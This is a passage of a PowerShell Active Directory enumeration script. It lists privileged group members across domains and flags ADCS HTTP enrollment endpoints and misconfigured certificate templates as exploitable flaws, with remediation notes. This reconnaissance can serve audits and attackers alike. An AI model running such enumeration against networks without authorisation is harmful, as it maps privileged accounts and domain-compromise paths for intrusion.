						$convertedMemberName = ConvertFrom-SID $ProtectedUser.MemberSID -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
					$ForeignGroupMemberAccount = $null
					$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $ProtectedUser.MemberSID
					$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				}
				
				$domainObject = Get-DomainObject -Identity $ProtectedUser.MemberName -Domain $Domain -Server $Server -Properties lastlogontimestamp
				$memberName = if ($ProtectedUser.MemberName) { $ProtectedUser.MemberName } else { $convertedMemberName }
				$isEnabled = if ($ProtectedUser.useraccountcontrol -band 2) { "False" } else { "True" }
				$lastLogon = $domainObject.lastlogontimestamp
				$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

				[PSCustomObject]@{
					"Member Name" = $memberName
					"Enabled" = $isEnabled
					"Active" = $isActive
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $ProtectedUser.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $ProtectedUser.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $ProtectedUser.MemberName.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $lastLogon
					"Member SID" = $ProtectedUser.MemberSID
					"Group Domain" = $ProtectedUser.GroupDomain
					#"Description" = $domainObject.description
				}
			}
		}
		else {
			$TempProtectedUsers = foreach ($AllDomain in $AllDomains) {
				$ProtectedUsers = Get-DomainGroupMember -Domain $AllDomain -Identity "Protected Users" -Recurse
				foreach($ProtectedUser in $ProtectedUsers){

    					$convertedMemberName = $null
					$PlaceHolderDomain = $null
					
					foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
						try {
							$convertedMemberName = ConvertFrom-SID $ProtectedUser.MemberSID -Domain $PlaceHolderDomain
							if ($null -ne $convertedMemberName) { break }
						}
						catch {
							continue
						}
					}

     					if($convertedMemberName){}
					else {
						$ForeignGroupMemberAccount = $null
						$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $ProtectedUser.MemberSID
						$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
					}
					
					$domainObject = Get-DomainObject -Identity $ProtectedUser.MemberName -Domain $AllDomain -Properties lastlogontimestamp
					$memberName = if ($ProtectedUser.MemberName) { $ProtectedUser.MemberName } else { $convertedMemberName }
					$isEnabled = if ($ProtectedUser.useraccountcontrol -band 2) { "False" } else { "True" }
					$lastLogon = $domainObject.lastlogontimestamp
					$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

					[PSCustomObject]@{
						"Member Name" = $memberName
						"Enabled" = $isEnabled
						"Active" = $isActive
      						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $ProtectedUser.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $ProtectedUser.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $ProtectedUser.MemberName.Contains($_) }) { "YES" } else { "NO" }
						#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
						#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
						#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
						"Last Logon" = $lastLogon
						"Member SID" = $ProtectedUser.MemberSID
						"Group Domain" = $ProtectedUser.GroupDomain
						#"Description" = $domainObject.description
					}
				}
			}
		}

		if ($TempProtectedUsers) {
			$TempProtectedUsers | Sort-Object -Unique "Group Domain","Member Name","Member SID" | Format-Table -Autosize -Wrap
			$HTMLProtectedUsers = $TempProtectedUsers | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2>Protected Users</h2>"
		}

		
		#################################################### 
		########### Read-Only Domain Controllers ################
		####################################################
		
		Write-Host ""
		Write-Host "Read-Only Domain Controllers:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$RODCs = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Read-Only Domain Controllers" -Recurse
			$TempRODCs = foreach($RODC in $RODCs){

   				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
						$convertedMemberName = ConvertFrom-SID $RODC.MemberSID -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
					$ForeignGroupMemberAccount = $null
					$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $RODC.MemberSID
					$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				}
				
				$domainObject = Get-DomainObject -Identity $RODC.MemberName -Domain $Domain -Server $Server -Properties lastlogontimestamp
				$memberName = if ($RODC.MemberName) { $RODC.MemberName } else { $convertedMemberName }
				$isEnabled = if ($RODC.useraccountcontrol -band 2) { "False" } else { "True" }
				$lastLogon = $domainObject.lastlogontimestamp
				$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

				[PSCustomObject]@{
					"Member Name" = $memberName
					"Enabled" = $isEnabled
					"Active" = $isActive
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $RODC.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $RODC.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $RODC.MemberName.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $lastLogon
					"Member SID" = $RODC.MemberSID
					"Group Domain" = $RODC.GroupDomain
					#"Description" = $domainObject.description
				}
			}
		}
		else {
			$TempRODCs = foreach ($AllDomain in $AllDomains) {
				$RODCs = Get-DomainGroupMember -Domain $AllDomain -Identity "Read-Only Domain Controllers" -Recurse
				foreach($RODC in $RODCs){

    					$convertedMemberName = $null
					$PlaceHolderDomain = $null
					
					foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
						try {
							$convertedMemberName = ConvertFrom-SID $RODC.MemberSID -Domain $PlaceHolderDomain
							if ($null -ne $convertedMemberName) { break }
						}
						catch {
							continue
						}
					}

     					if($convertedMemberName){}
					else {
						$ForeignGroupMemberAccount = $null
						$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $RODC.MemberSID
						$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
					}
					
					$domainObject = Get-DomainObject -Identity $RODC.MemberName -Domain $AllDomain -Properties lastlogontimestamp
					$memberName = if ($RODC.MemberName) { $RODC.MemberName } else { $convertedMemberName }
					$isEnabled = if ($RODC.useraccountcontrol -band 2) { "False" } else { "True" }
					$lastLogon = $domainObject.lastlogontimestamp
					$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

					[PSCustomObject]@{
						"Member Name" = $memberName
						"Enabled" = $isEnabled
						"Active" = $isActive
      						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $RODC.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $RODC.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $RODC.MemberName.Contains($_) }) { "YES" } else { "NO" }
						#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
						#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
						#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
						"Last Logon" = $lastLogon
						"Member SID" = $RODC.MemberSID
						"Group Domain" = $RODC.GroupDomain
						#"Description" = $domainObject.description
					}
				}
			}
		}

		if ($TempRODCs) {
			$TempRODCs | Sort-Object -Unique "Group Domain","Member Name","Member SID" | Format-Table -Autosize -Wrap
			$HTMLRODCs = $TempRODCs | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2>Read-Only Domain Controllers</h2>"
		}
		
		
		
		#################################################### 
		########### Schema Admins ################
		####################################################
		
		Write-Host ""
		Write-Host "Schema Admins:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$SchemaAdmins = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Schema Admins" -Recurse
			$TempSchemaAdmins = foreach($SchemaAdmin in $SchemaAdmins){

   				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
						$convertedMemberName = ConvertFrom-SID $SchemaAdmin.MemberSID -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
					$ForeignGroupMemberAccount = $null
					$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $SchemaAdmin.MemberSID
					$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				}
				
				$domainObject = Get-DomainObject -Identity $SchemaAdmin.MemberName -Domain $Domain -Server $Server -Properties lastlogontimestamp
				$memberName = if ($SchemaAdmin.MemberName) { $SchemaAdmin.MemberName } else { $convertedMemberName }
				$isEnabled = if ($SchemaAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
				$lastLogon = $domainObject.lastlogontimestamp
				$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

				[PSCustomObject]@{
					"Member Name" = $memberName
					"Enabled" = $isEnabled
					"Active" = $isActive
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $SchemaAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $SchemaAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $SchemaAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $lastLogon
					"Member SID" = $SchemaAdmin.MemberSID
					"Group Domain" = $SchemaAdmin.GroupDomain
					#"Description" = $domainObject.description
				}

			}
		}
	 
		else {
			$TempSchemaAdmins = foreach ($AllDomain in $AllDomains) {
				$SchemaAdmins = Get-DomainGroupMember -Domain $AllDomain -Identity "Schema Admins" -Recurse
				foreach($SchemaAdmin in $SchemaAdmins){

    					$convertedMemberName = $null
					$PlaceHolderDomain = $null
					
					foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
						try {
							$convertedMemberName = ConvertFrom-SID $SchemaAdmin.MemberSID -Domain $PlaceHolderDomain
							if ($null -ne $convertedMemberName) { break }
						}
						catch {
							continue
						}
					}

     					if($convertedMemberName){}
					else {
						$ForeignGroupMemberAccount = $null
						$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $SchemaAdmin.MemberSID
						$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
					}
					
					$domainObject = Get-DomainObject -Identity $SchemaAdmin.MemberName -Domain $AllDomain -Properties lastlogontimestamp
					$memberName = if ($SchemaAdmin.MemberName) { $SchemaAdmin.MemberName } else { $convertedMemberName }
					$isEnabled = if ($SchemaAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
					$lastLogon = $domainObject.lastlogontimestamp

					$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

					[PSCustomObject]@{
						"Member Name" = $memberName
						"Enabled" = $isEnabled
						"Active" = $isActive
      						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $SchemaAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $SchemaAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $SchemaAdmin.MemberName.Contains($_) }) { "YES" } else { "NO" }
						#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
						#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
						#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
						"Last Logon" = $lastLogon
						"Member SID" = $SchemaAdmin.MemberSID
						"Group Domain" = $SchemaAdmin.GroupDomain
						#"Description" = $domainObject.description
					}

				}
			}
		}

		if ($TempSchemaAdmins) {
			$TempSchemaAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ft -Autosize -Wrap
			$HTMLSchemaAdmins = $TempSchemaAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2>Schema Admins</h2>"
		}
		
		#################################################### 
		########### Server Operators ################
		####################################################
		
		Write-Host ""
		Write-Host "Server Operators:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$ServerOperators = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Server Operators" -Recurse
			$TempServerOperators = foreach($ServerOperator in $ServerOperators){

   				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
						$convertedMemberName = ConvertFrom-SID $ServerOperator.MemberSID -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
					$ForeignGroupMemberAccount = $null
					$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $ServerOperator.MemberSID
					$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				}
				
				$domainObject = Get-DomainObject -Identity $ServerOperator.MemberName -Domain $Domain -Server $Server -Properties lastlogontimestamp
				$memberName = if ($ServerOperator.MemberName) { $ServerOperator.MemberName } else { $convertedMemberName }
				$isEnabled = if ($ServerOperator.useraccountcontrol -band 2) { "False" } else { "True" }
				$lastLogon = $domainObject.lastlogontimestamp
				$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

				[PSCustomObject]@{
					"Member Name" = $memberName
					"Enabled" = $isEnabled
					"Active" = $isActive
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $ServerOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $ServerOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $ServerOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $lastLogon
					"Member SID" = $ServerOperator.MemberSID
					"Group Domain" = $ServerOperator.GroupDomain
					#"Description" = $domainObject.description
				}
			}
		}
		else {
			$TempServerOperators = foreach ($AllDomain in $AllDomains) {
				$ServerOperators = Get-DomainGroupMember -Domain $AllDomain -Identity "Server Operators" -Recurse
				foreach($ServerOperator in $ServerOperators){

    					$convertedMemberName = $null
					$PlaceHolderDomain = $null
					
					foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
						try {
							$convertedMemberName = ConvertFrom-SID $ServerOperator.MemberSID -Domain $PlaceHolderDomain
							if ($null -ne $convertedMemberName) { break }
						}
						catch {
							continue
						}
					}

     					if($convertedMemberName){}
					else {
						$ForeignGroupMemberAccount = $null
						$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $ServerOperator.MemberSID
						$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
					}
					
					$domainObject = Get-DomainObject -Identity $ServerOperator.MemberName -Domain $AllDomain -Properties lastlogontimestamp
					$memberName = if ($ServerOperator.MemberName) { $ServerOperator.MemberName } else { $convertedMemberName }
					$isEnabled = if ($ServerOperator.useraccountcontrol -band 2) { "False" } else { "True" }
					$lastLogon = $domainObject.lastlogontimestamp
					$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

					[PSCustomObject]@{
						"Member Name" = $memberName
						"Enabled" = $isEnabled
						"Active" = $isActive
      						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $ServerOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $ServerOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $ServerOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
						#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
						#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
						#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
						"Last Logon" = $lastLogon
						"Member SID" = $ServerOperator.MemberSID
						"Group Domain" = $ServerOperator.GroupDomain
						#"Description" = $domainObject.description
					}
				}
			}
		}

		if ($TempServerOperators) {
			$TempServerOperators | Sort-Object -Unique "Group Domain","Member Name","Member SID" | Format-Table -Autosize -Wrap
			$HTMLServerOperators = $TempServerOperators | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2>Server Operators</h2>"
		}



	}

 	<#
	############################################################
    ############# Current User Group Membership ################
	############################################################
	
	Write-Host ""
    Write-Host "Groups the current user is part of:" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Current User: $env:USERNAME"
    if($Domain -AND $Server) {
		$GetCurrUserGroups = Get-DomainGroup -Domain $Domain -Server $Server -UserName $env:USERNAME | Where-Object { $_.samaccountname -notlike "Domain Users" }
    		$TempGetCurrUserGroup = foreach($GetCurrUserGroup in $GetCurrUserGroups){
			[PSCustomObject]@{
				"Group Name" = $GetCurrUserGroup.samaccountname
				"Object SID" = $GetCurrUserGroup.objectsid
				Domain = $Domain
				#"Members of this group (Users)" = ((Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity $GetCurrUserGroup.samaccountname).MemberName | Sort-Object -Unique) -join ' - '
			}
		}
		
		if($TempGetCurrUserGroup){
			$TempGetCurrUserGroup | Sort-Object Domain,"Group Name" | ft -Autosize -Wrap
			$HTMLGetCurrUserGroup = $TempGetCurrUserGroup | Sort-Object Domain,"Group Name" | ConvertTo-Html -Fragment -PreContent "<h2>Groups the current user is part of</h2>"
		}
    }
    else{
    	$TempGetCurrUserGroup = foreach($AllDomain in $AllDomains){
			$GetCurrUserGroups = Get-DomainGroup -Domain $AllDomain -UserName $env:USERNAME | Where-Object { $_.samaccountname -notlike "Domain Users" }
			foreach($GetCurrUserGroup in $GetCurrUserGroups){
				[PSCustomObject]@{
					"Group Name" = $GetCurrUserGroup.samaccountname
					"Object SID" = $GetCurrUserGroup.objectsid
					Domain = $AllDomain
					#"Members of this group" = ((Get-DomainGroupMember -Domain $AllDomain -Recurse -Identity $GetCurrUserGroup.samaccountname).MemberName | Sort-Object -Unique) -join ' - '
				}
			}
		}
		
		if($TempGetCurrUserGroup){
			$TempGetCurrUserGroup | Sort-Object Domain,"Group Name" | ft -Autosize -Wrap
			$HTMLGetCurrUserGroup = $TempGetCurrUserGroup | Sort-Object Domain,"Group Name" | ConvertTo-Html -Fragment -PreContent "<h2>Groups the current user is part of</h2>"
		}
    }

    #>
	
	$MisconfigurationsBanner = "<h3>Configuration Flaws with Potential for Exploitation</h3>"
	Write-Host ""
	Write-Host "Configuration Flaws with Potential for Exploitation" -ForegroundColor Red
	Write-Host ""
	
	###############################################
    ########### ADCS HTTP Endpoints ###############
	###############################################
	if($NoVulnCertTemplates){}
	else{
		Write-Host ""
		Write-Host "ADCS HTTP Endpoints:" -ForegroundColor Cyan

		if ($Domain -and $Server) {
			
			$CertPublishers = Get-DomainGroupMember "Cert Publishers" -Domain $Domain -Server $Server | Select-Object MemberName,MemberSID,GroupName,GroupDomain

			$TempCertPublishers = foreach ($CertPublisher in $CertPublishers) {
				
				$CAName = $CertPublisher.MemberName.TrimEnd('$')
				
				$Endpoint = "$CAName.$Domain/certsrv/"
				$httpuri = "http://$CAName.$Domain/certsrv/"
				$httpsuri = "https://$CAName.$Domain/certsrv/"
				
				$httpresponse = Invoke-WebRequest -Uri $httpuri -UseDefaultCredentials -TimeoutSec 5 -UseBasicParsing
				$httpsresponse = Invoke-WebRequest -Uri $httpsuri -UseDefaultCredentials -TimeoutSec 5 -UseBasicParsing
				
				if(($httpresponse.statuscode -eq 200) -OR ($httpsresponse.statuscode -eq 200)){
				
					[PSCustomObject]@{
						"Member Name" = $CertPublisher.MemberName
						"IP Address" = (Resolve-DnsName -Name "$CAName.$Domain" -Type A).IPAddress
						"Member SID" = $CertPublisher.MemberSID
						"Group Name" = $CertPublisher.GroupName
						"Endpoint" = $Endpoint
						"HTTP" = if ($httpresponse.statuscode -eq 200) {"True"} else {"False"}
						"HTTPS" = if ($httpsresponse.statuscode -eq 200) {"True"} else {"False"}
						"Domain" = $CertPublisher.GroupDomain
					}
					
				}
				
			}			
		}
		
		else {
			
			$TempCertPublishers = foreach ($AllDomain in $AllDomains) {
			
				$CertPublishers = Get-DomainGroupMember "Cert Publishers" -Domain $AllDomain | Select-Object MemberName,MemberSID,GroupName,GroupDomain

				foreach ($CertPublisher in $CertPublishers) {
					
					$CAName = $CertPublisher.MemberName.TrimEnd('$')
					
					$Endpoint = "$CAName.$AllDomain/certsrv/"
					$httpuri = "http://$CAName.$AllDomain/certsrv/"
					$httpsuri = "https://$CAName.$AllDomain/certsrv/"
					
					$httpresponse = Invoke-WebRequest -Uri $httpuri -UseDefaultCredentials -TimeoutSec 5 -UseBasicParsing
					$httpsresponse = Invoke-WebRequest -Uri $httpsuri -UseDefaultCredentials -TimeoutSec 5 -UseBasicParsing
					
					if(($httpresponse.statuscode -eq 200) -OR ($httpsresponse.statuscode -eq 200)){
					
						[PSCustomObject]@{
							"Member Name" = $CertPublisher.MemberName
							"IP Address" = (Resolve-DnsName -Name "$CAName.$AllDomain" -Type A).IPAddress
							"Member SID" = $CertPublisher.MemberSID
							"Group Name" = $CertPublisher.GroupName
							"Endpoint" = $Endpoint
							"HTTP" = if ($httpresponse.statuscode -eq 200) {"True"} else {"False"}
							"HTTPS" = if ($httpsresponse.statuscode -eq 200) {"True"} else {"False"}
							"Domain" = $CertPublisher.GroupDomain
						}
						
					}
					
				}
			
			}
		}

    		if ($TempCertPublishers) {
			$TempCertPublishers | Sort-Object Domain,"Member Name" | Format-Table -AutoSize -Wrap
			$HTMLCertPublishers = $TempCertPublishers | Sort-Object Domain,"Member Name" | ConvertTo-Html -Fragment -PreContent "<h2>ADCS HTTP Endpoints</h2>"

      			$ADCSEndpointsTable = [PSCustomObject]@{
				"Risk Rating" = "Critical - Needs Immediate Attention"
				"Description" = "These endpoints can be exploited through NTLM relay attacks to issue unauthorized certificates for targeted domain computers, leading to domain compromise."
				"Remediation" = "Disable HTTP and HTTPS access to the certificate enrolment interface for quick resolution."
			}
			
			$HTMLADCSEndpointsTable = $ADCSEndpointsTable | ConvertTo-Html -As List -Fragment
   			$HTMLADCSEndpointsTable = $HTMLADCSEndpointsTable.Replace("Remediation", '<a href="https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429">Remediation</a>')
		}
	}
	
	###############################################################
    ########### Misconfigured Certificate Templates ###############
	###############################################################
	if($NoVulnCertTemplates){}
	else{
		Write-Host ""
		Write-Host "Misconfigured Certificate Templates (do not rely solely on this output):" -ForegroundColor Cyan

		if ($Domain -and $Server) {
			$CertDomainName = "DC=" + $Domain.Split(".")
			$CertDomainName = $CertDomainName -replace " ", ",DC="
			
			$acl = Get-DomainObjectACL -Domain $Domain -Server $Server -SearchBase "CN=Configuration,$CertDomainName" -LDAPFilter "(objectclass=pkicertificatetemplate)" -ResolveGUIDs | %{ $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID -Domain $Domain -Server $Server $_.SecurityIdentifier.value) -Force; $_ }
			
			$VulnCertUsers = $acl | ?{ $_.Identity -match "Domain Users" } 
			$vulnCertComputers = $acl | ?{ $_.Identity -match "Domain Computers" }
			
			$VulnCertFlags = Get-DomainObject -Domain $Domain -Server $Server -SearchBase "CN=Configuration,$CertDomainName" -LDAPFilter "(objectclass=pkicertificatetemplate)" | Where-Object {($_. "mspki-certificate-name-flag" -eq "1" -and $_.pkiextendedkeyusage -like "1.3.6.1.5.5.7.3.2") -and (($vulnCertUsers.ObjectDN -contains $_.distinguishedname) -or ($vulnCertComputers.ObjectDN -contains $_.distinguishedname))}
			$VulnCertUsersX = $VulnCertUsers | Where-Object {($_.ActiveDirectoryRights -match "WriteDacl") -or ($_.ActiveDirectoryRights -match "WriteOwner")}
			$vulnCertComputersX = $vulnCertComputers | Where-Object {($_.ActiveDirectoryRights -match "WriteDacl") -or ($_.ActiveDirectoryRights -match "WriteOwner")}

			$VulnCertTemplatesFlags = foreach ($vulnCertFlag in $VulnCertFlags) {
				[PSCustomObject]@{
					"Cert Template" = $vulnCertFlag.cn
					"Extended Key Usage" = "Client Authentication"
					"Flag" = "ENROLLEE_SUPPLIES_SUBJECT"
					"Enrollment Rights" = "Domain Users"
					"Domain" = $Domain
				}
			}
			
			$TempVulnCertComputers = foreach ($vulnCertComputer in $vulnCertComputersX) {
				[PSCustomObject]@{
					"Cert Template" = $vulnCertComputer.ObjectDN.Split(',')[0] -replace 'CN='
					"Identity" = "Domain Computers"
					"Active Directory Rights" = "WriteDacl or WriteOwner"
					"Domain" = $Domain
				}
			}
			
			$TempVulnCertUsers = foreach ($vulnCertUser in $VulnCertUsersX) {
				[PSCustomObject]@{
					"Cert Template" = $vulnCertUser.ObjectDN.Split(',')[0] -replace 'CN='
					"Identity" = "Domain Users"
					"Active Directory Rights" = "WriteDacl or WriteOwner"
					"Domain" = $Domain
				}
			}
		}
		
		else {
			$VulnCertTemplatesFlags = @()
			$TempVulnCertComputers = @()
			$TempVulnCertUsers = @()

			foreach ($AllDomain in $AllDomains) {
				$CertDomainName = "DC=" + $AllDomain.Split(".") -replace " ", ",DC="
				$DomainObjectACLs = Get-DomainObjectACL -Domain $AllDomain -SearchBase "CN=Configuration,$CertDomainName" -LDAPFilter "(objectclass=pkicertificatetemplate)" -ResolveGUIDs
				
				$VulnCertUsers = $DomainObjectACLs | %{$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID -Domain $AllDomain $_.SecurityIdentifier.value) -Force; $_} | ?{ $_.Identity -match "Domain Users" }
				$vulnCertComputers = $DomainObjectACLs | ForEach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID -Domain $AllDomain $_.SecurityIdentifier.value) -Force; $_ } | Where-Object { $_.Identity -match "Domain Computers" }
				$VulnCertFlags = Get-DomainObject -Domain $AllDomain -SearchBase "CN=Configuration,$CertDomainName" -LDAPFilter "(objectclass=pkicertificatetemplate)" | Where-Object {($_. "mspki-certificate-name-flag" -eq "1" -and $_.pkiextendedkeyusage -like "1.3.6.1.5.5.7.3.2") -and (($vulncertusers.ObjectDN -contains $_.distinguishedname) -or ($vulncertcomputers.ObjectDN -contains $_.distinguishedname))}
				
				foreach ($vulncertflag in $VulnCertFlags) {
					$VulnCertTemplatesFlags += [PSCustomObject]@{
						"Cert Template" = $vulncertflag.cn
						"Extended Key Usage" = "Client Authentication"
						"Flag" = "ENROLLEE_SUPPLIES_SUBJECT"
						"Enrollment Rights" = "Domain Users"
						"Domain" = $AllDomain
					}
				}

				$vulnCertComputersRights = $vulnCertComputers | Where-Object {($_.ActiveDirectoryRights -match "WriteDacl") -or ($_.ActiveDirectoryRights -match "WriteOwner")}
				foreach ($vulnCertComputer in $vulnCertComputersRights) {
					$TempVulnCertComputers += [PSCustomObject]@{
						"Cert Template" = $vulnCertComputer.ObjectDN.Split(',')[0] -replace 'CN='
						"Identity" = "Domain Computers"
						"Active Directory Rights" = "WriteDacl or WriteOwner"
						"Domain" = $AllDomain
					}
				}
				
